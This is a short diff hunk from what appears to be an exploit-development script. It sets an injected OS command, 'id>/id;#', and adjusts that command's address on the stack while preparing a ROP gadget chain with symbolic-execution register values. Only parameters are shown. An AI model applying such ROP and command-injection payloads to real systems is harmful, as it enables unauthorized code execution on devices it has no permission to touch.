@@ -10,7 +10,7 @@ ast = ast
 # OS command
 md5_sum_len = 32
 cmd         = "id>/id;#"
-cmd_addr    = 0xbeffc104+396
+cmd_addr    = 0xbeffc0c4+396
 
 # Preconditions gadget 0
 g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*4
